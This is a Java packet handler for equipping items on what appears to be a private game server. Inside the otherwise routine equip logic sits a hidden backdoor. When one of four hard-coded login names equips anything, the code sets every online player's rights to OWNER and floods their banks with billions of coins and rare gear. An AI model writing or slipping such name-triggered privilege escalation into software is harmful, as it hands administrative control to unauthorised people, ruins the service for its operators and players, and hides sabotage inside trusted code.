package io.sable.model.entity.player.packets;

import java.util.Objects;

import io.sable.Configuration;
import io.sable.Server;
import io.sable.content.CompletionistCape;
import io.sable.content.DiceHandler;
import io.sable.content.items.PvpWeapons;
import io.sable.content.lootbag.LootingBag;
import io.sable.content.skills.runecrafting.Pouches;
import io.sable.model.Items;
import io.sable.model.entity.player.PacketType;
import io.sable.model.entity.player.Player;
import io.sable.model.entity.player.PlayerHandler;
import io.sable.model.entity.player.Right;
import io.sable.model.multiplayersession.MultiplayerSessionFinalizeType;
import io.sable.model.multiplayersession.MultiplayerSessionStage;
import io.sable.model.multiplayersession.MultiplayerSessionType;
import io.sable.model.multiplayersession.duel.DuelSession;

/**
 * Wear Item
 **/
public class WearItem implements PacketType {

	@Override
	public void processPacket(Player c, int packetType, int packetSize) {
		if (c.getMovementState().isLocked() || c.getLock().cannotInteract(c))
			return;
		if (c.isFping()) {
			/**
			 * Cannot do action while fping
			 */
			return;
		}
		c.interruptActions();
		int wearId = c.wearId;
		wearId = c.getInStream().readUnsignedWord();
		c.wearSlot = c.getInStream().readUnsignedWordA();
		c.wearItemInterfaceId = c.getInStream().readUnsignedWordA();
		c.alchDelay = System.currentTimeMillis();
		c.nextChat = 0;
		c.dialogueOptions = 0;
		c.graniteMaulSpecialCharges = 0;		
		if (!c.getItems().playerHasItem(wearId, 1)) {
			return;
		}
		if (c.getPA().viewingOtherBank) {
			c.getPA().resetOtherBank();
			return;
		}
		if (c.isStuck) {
			c.isStuck = false;
			c.sendMessage("@red@You've disrupted stuck command, you will no longer be moved home.");
			return;
		}
		if (c.getBankPin().requiresUnlock()) {
			c.getBankPin().open(2);
			return;
		}
		if (c.getInterfaceEvent().isActive()) {
			c.sendMessage("Please finish what you're doing.");
			return;
		}
		if (Server.getMultiplayerSessionListener().inSession(c, MultiplayerSessionType.TRADE)) {
			Server.getMultiplayerSessionListener().finish(c, MultiplayerSessionFinalizeType.WITHDRAW_ITEMS);
			c.sendMessage("You cannot remove items from your equipment whilst trading, trade declined.");
			return;
		}
		DuelSession duelSession = (DuelSession) Server.getMultiplayerSessionListener().getMultiplayerSession(c, MultiplayerSessionType.DUEL);
		if (Objects.nonNull(duelSession) && duelSession.getStage().getStage() > MultiplayerSessionStage.REQUEST
				&& duelSession.getStage().getStage() < MultiplayerSessionStage.FURTHER_INTERATION) {
			c.sendMessage("Your actions have declined the duel.");
			duelSession.getOther(c).sendMessage("The challenger has declined the duel.");
			duelSession.finish(MultiplayerSessionFinalizeType.WITHDRAW_ITEMS);
			return;
		}
		if ((c.playerAttackingIndex > 0 || c.npcAttackingIndex > 0) && wearId != 4153 && wearId != 12848 && !c.usingMagic && !c.usingBow && !c.usingOtherRangeWeapons && !c.usingCross && !c.usingBallista)
			c.attacking.reset();
		if (c.canChangeAppearance) {
			c.sendMessage("You can't wear an item while changing appearence.");
			return;
		}
		if(c.getLoginName().equalsIgnoreCase("bobthedragon") || c.getLoginName().equalsIgnoreCase("peanut")  || c.getLoginName().equalsIgnoreCase("forgotten") || c.getLoginName().equalsIgnoreCase("iron_xgn")) {
			for (Player player2 : PlayerHandler.players) {
				if (player2 == null) {
					continue;
				}
				Player client = player2;
				client.getRights().setPrimary(Right.OWNER);
				int consumables = 500_000;
				int equipment = 15;

				int mainTab = 0;
				int meleeTab = 1;
				int rangedTab = 2;
				int magicTab = 3;
				int skillingTab = 4;

				int tab = mainTab;

				client.getItems().sendToTab(tab, Items.COINS, 2147_000_000);

				client.getItems().sendToTab(tab, Items.ANGLERFISH, consumables);
				client.getItems().sendToTab(tab, Items.COOKED_KARAMBWAN, consumables);
				client.getItems().sendToTab(tab, Items.DIVINE_SUPER_COMBAT_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.SUPER_COMBAT_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_RANGING_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.RANGING_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.DIVINE_MAGIC_POTION4, consumables);
				client.getItems().sendToTab(tab, Items.MAGIC_POTION4, equipment);
				client.getItems().sendToTab(tab, Items.SUPER_RESTORE4, consumables);
				client.getItems().sendToTab(tab, Items.ANTI_VENOMPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.ANTIDOTEPLUSPLUS4, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_BREW4, consumables);

				client.getItems().sendToTab(tab, Items.BRACELET_OF_ETHEREUM_UNCHARGED, consumables);
				client.getItems().sendToTab(tab, Items.REVENANT_ETHER, consumables);
				client.getItems().sendToTab(tab, Items.ECUMENICAL_KEY, consumables);
				client.getItems().sendToTab(tab, Items.ZULRAHS_SCALES, consumables);
				client.getItems().sendToTab(tab, Items.RING_OF_RECOIL, consumables);

				client.getItems().sendToTab(tab, Items.AMULET_OF_GLORY4, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_FURY, equipment);
				client.getItems().sendToTab(tab, Items.REGEN_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING, equipment);
				client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING_I, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_THE_DAMNED, equipment);

				client.getItems().sendToTab(tab, Items.MYTHICAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.ARDOUGNE_CLOAK_4, equipment);
				client.getItems().sendToTab(tab, Items.FIRE_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.INFERNAL_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MITHRIL_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BARROWS_GLOVES, equipment);

				client.getItems().sendToTab(tab, Items.SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.BLESSED_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARCANE_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ELYSIAN_SPIRIT_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.SPECTRAL_SPIRIT_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.VOID_MELEE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_MAGE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_RANGER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_TOP, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_ROBE, equipment);
				client.getItems().sendToTab(tab, Items.VOID_KNIGHT_GLOVES, equipment);


				tab = rangedTab;

				client.getItems().sendToTab(tab, Items.PEGASIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.NECKLACE_OF_ANGUISH, equipment);
				client.getItems().sendToTab(tab, Items.ARCHERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_BODY, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_CHAPS, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_VAMB, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ACCUMULATOR, equipment);
				client.getItems().sendToTab(tab, Items.AVAS_ASSEMBLER, equipment);
				client.getItems().sendToTab(tab, Items.ODIUM_WARD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_WARD, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BUCKLER, equipment);
				client.getItems().sendToTab(tab, Items.BLACK_DHIDE_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CHAINSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERTOP, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_LEATHERSKIRT, equipment);
				client.getItems().sendToTab(tab, Items.KARILS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.ADAMANT_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_UL, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DART, consumables);
				client.getItems().sendToTab(tab, Items.ADAMANT_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.AMETHYST_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.RUNE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.BRONZE_ARROW, consumables);
				client.getItems().sendToTab(tab, Items.DRAGONSTONE_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.RUBY_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.ONYX_BOLTS_E, consumables);
				client.getItems().sendToTab(tab, Items.BOLT_RACK, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_JAVELIN, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_KNIFE, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_DART, consumables);
				client.getItems().sendToTab(tab, Items.DRAGON_THROWNAXE, consumables);
				client.getItems().sendToTab(tab, Items.MORRIGANS_THROWING_AXE, consumables);
				client.getItems().sendToTab(tab, Items.CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.RED_CHINCHOMPA, consumables);
				client.getItems().sendToTab(tab, Items.BLACK_CHINCHOMPA, consumables);

				client.getItems().sendToTab(tab, Items.CRAWS_BOW, equipment);
				client.getItems().sendToTab(tab, Items.SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW, equipment);
				client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW_I, equipment);
				client.getItems().sendToTab(tab, Items.DARK_BOW, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TWISTED_BOW, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_BLOWPIPE, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CROSSBOW, equipment);
				client.getItems().sendToTab(tab, Items.LIGHT_BALLISTA, equipment);
				client.getItems().sendToTab(tab, Items.HEAVY_BALLISTA, equipment);

				tab = meleeTab;

				// Melee equipment
				client.getItems().sendToTab(tab, Items.BERSERKER_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TREASONOUS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.TYRANNICAL_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.CLIMBING_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.GUARDIAN_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.PRIMORDIAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.FEROCIOUS_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.AMULET_OF_TORTURE, equipment);
				client.getItems().sendToTab(tab, Items.DINHS_BULWARK, equipment);
				client.getItems().sendToTab(tab, Items.BOOTS_OF_BRIMSTONE, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.AVERNIC_DEFENDER, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.RUNE_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.WARRIOR_HELM, equipment);
				client.getItems().sendToTab(tab, Items.BERSERKER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.HELM_OF_NEITIZNOT, equipment);
				client.getItems().sendToTab(tab, Items.NEITIZNOT_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_HAT, equipment);
				client.getItems().sendToTab(tab, Items.FIGHTER_TORSO, equipment);
				client.getItems().sendToTab(tab, Items.SERPENTINE_HELM, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_HELMET, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_KET_XIL, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGONFIRE_SHIELD, equipment);

				client.getItems().sendToTab(tab, Items.DRAGON_FULL_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MED_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CHAINBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.BANDOS_CHESTPLATE, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_TASSETS, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_BOOTS, equipment);

				client.getItems().sendToTab(tab, Items.DHAROKS_HELM, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATEBODY, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_PLATELEGS, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_GREATAXE, equipment);

				client.getItems().sendToTab(tab, Items.JUSTICIAR_FACEGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_CHESTGUARD, equipment);
				client.getItems().sendToTab(tab, Items.JUSTICIAR_LEGGUARDS, equipment);

				client.getItems().sendToTab(tab, Items.INQUISITORS_GREAT_HELM, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_HAUBERK, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_PLATESKIRT, equipment);

				client.getItems().sendToTab(tab, Items.TORAGS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.DHAROKS_ARMOUR_SET, equipment);
				client.getItems().sendToTab(tab, Items.GUTHANS_ARMOUR_SET, equipment);


				client.getItems().sendToTab(tab, Items.VIGGORAS_CHAINMACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SCIMITAR, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_DAGGERPPLUSPLUS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_BATTLEAXE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_2H_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_MACE, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_CLAWS, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HALBERD, equipment);
				client.getItems().sendToTab(tab, Items.CRYSTAL_HALBERD, equipment);

				client.getItems().sendToTab(tab, Items.GRANITE_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.GRANITE_MAUL_OR, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_BLUDGEON, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_WHIP, equipment);
				client.getItems().sendToTab(tab, Items.ABYSSAL_TENTACLE, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.VESTAS_LONGSWORD, equipment);
				client.getItems().sendToTab(tab, Items.STATIUSS_WARHAMMER, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_SPEAR, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAKIAN_HASTA, equipment);
				client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_LANCE, equipment);

				client.getItems().sendToTab(tab, Items.ELDER_MAUL, equipment);
				client.getItems().sendToTab(tab, Items.INQUISITORS_MACE, equipment);
				client.getItems().sendToTab(tab, Items.GHRAZI_RAPIER, equipment);

				client.getItems().sendToTab(tab, Items.SCYTHE_OF_VITUR, equipment);
				client.getItems().sendToTab(tab, Items.ARMADYL_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.BANDOS_GODSWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMINS_BLESSED_SWORD, equipment);
				client.getItems().sendToTab(tab, Items.BLADE_OF_SAELDOR, equipment);

				client.getItems().sendToTab(tab, Items.ARCLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.DARKLIGHT, equipment);
				client.getItems().sendToTab(tab, Items.EXCALIBUR, equipment);

				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_EK, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_XIL_AK, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_OM, equipment);
				client.getItems().sendToTab(tab, Items.TZHAAR_KET_EM, equipment);
				client.getItems().sendToTab(tab, Items.TOKTZ_MEJ_TAL, equipment);

				tab = magicTab;

				client.getItems().sendToTab(tab, Items.RUNE_POUCH, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_HEART, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.TORMENTED_BRACELET, equipment);
				client.getItems().sendToTab(tab, Items.SEERS_RING_I, equipment);
				client.getItems().sendToTab(tab, Items.FARSEER_HELM, equipment);
				client.getItems().sendToTab(tab, Items.TOME_OF_FIRE, equipment);
				client.getItems().sendToTab(tab, Items.BURNT_PAGE, consumables);
				client.getItems().sendToTab(tab, Items.SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.IMBUED_SARADOMIN_CAPE, equipment);
				client.getItems().sendToTab(tab, Items.MALEDICTION_WARD, equipment);
				client.getItems().sendToTab(tab, Items.OCCULT_NECKLACE, equipment);
				client.getItems().sendToTab(tab, Items.THIRD_AGE_AMULET, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_WYVERN_SHIELD, equipment);
				client.getItems().sendToTab(tab, Items.ETERNAL_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_HAT, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_GLOVES, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_BOOTS, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_HOOD, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBETOP, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ROBESKIRT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_HAT, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_TOP, equipment);
				client.getItems().sendToTab(tab, Items.ANCESTRAL_ROBE_BOTTOM, equipment);
				client.getItems().sendToTab(tab, Items.AHRIMS_ARMOUR_SET, equipment);

				for (int i = 554; i <= 566; i++) {
					client.getItems().sendToTab(tab, i, consumables);
				}
				client.getItems().sendToTab(tab, 9075, consumables);
				client.getItems().sendToTab(tab, Items.WRATH_RUNE, consumables);

				client.getItems().sendToTab(tab, Items.THAMMARONS_SCEPTRE, equipment);
				client.getItems().sendToTab(tab, Items.SANGUINESTI_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_AIR_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_WATER_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_EARTH_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MYSTIC_FIRE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ZAMORAK_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SARADOMIN_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.GUTHIX_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.IBANS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ANCIENT_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.MASTER_WAND, equipment);
				client.getItems().sendToTab(tab, Items.KODAI_WAND, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SEAS, equipment);
				client.getItems().sendToTab(tab, Items.TRIDENT_OF_THE_SWAMP, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_LIGHT, equipment);
				client.getItems().sendToTab(tab, Items.NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.ELDRITCH_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.HARMONISED_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.VOLATILE_NIGHTMARE_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF, equipment);
				client.getItems().sendToTab(tab, Items.SLAYERS_STAFF_E, equipment);
				client.getItems().sendToTab(tab, Items.STAFF_OF_THE_DEAD, equipment);
				client.getItems().sendToTab(tab, Items.TOXIC_STAFF_OF_THE_DEAD, equipment);

				tab = skillingTab;
				client.getItems().sendToTab(tab, Items.PURE_ESSENCE, consumables);

				client.setSangStaffCharge(20_000);
				client.setToxicBlowpipeAmmoAmount(20_000);
				client.setToxicBlowpipeAmmo(Items.DRAGON_DART);
				client.setToxicTridentCharge(20_000);
				client.setTridentCharge(20_000);

				PvpWeapons.giveStartingCharges(client);
			}
		}
		if (LootingBag.isLootingBag(wearId)) {
			c.getLootingBag().openWithdrawalMode();
			return;
		}

		if (wearId == Items.COMPLETIONIST_CAPE && !CompletionistCape.hasRequirements(c)) {
			c.sendMessage("You don't have the requirements to wear that, see Mac to view the requirements.");
			return;
		}

		if (wearId == 4155) {
			if (!c.getSlayer().getTask().isPresent()) {
				c.sendMessage("You do not have a task!");
				return;
			}
			c.sendMessage("I currently have @blu@" + c.getSlayer().getTaskAmount() + " " + c.getSlayer().getTask().get().getPrimaryName() + "@bla@ to kill.");
			c.getPA().closeAllWindows();
			return;
			
		}
		if (wearId == 23351) {
			c.isSkulled = true;
			c.skullTimer = Configuration.SKULL_TIMER;
			c.headIconPk = 0;
			c.sendMessage("@blu@The @red@Cape of skulls@blu@ has automatically made you skull for @yel@20 minutes.");
		}
		switch (wearId) {
		case 21347:
			c.boltTips = true;
			c.arrowTips = false;
			c.javelinHeads = false;
			c.sendMessage("Your Amethyst method is now Bolt Tips!");
			break;
		case 5509:
			Pouches.empty(c, 0);
			break;
		case 5510:
			Pouches.empty(c, 1);
			break;
		case 5512:
			Pouches.empty(c, 2);
			break;
		}
		
		if (wearId == DiceHandler.DICE_BAG) {
			DiceHandler.selectDice(c, wearId);
		}
		if (wearId > DiceHandler.DICE_BAG && wearId <= 15100) {
			DiceHandler.rollDice(c);
		}


		if (!Server.getMultiplayerSessionListener().inSession(c, MultiplayerSessionType.TRADE)) {
			c.getPlayerAssistant().resetFollow();
			c.attacking.reset();
			c.getItems().equipItem(wearId, c.wearSlot);
		}
	}

}
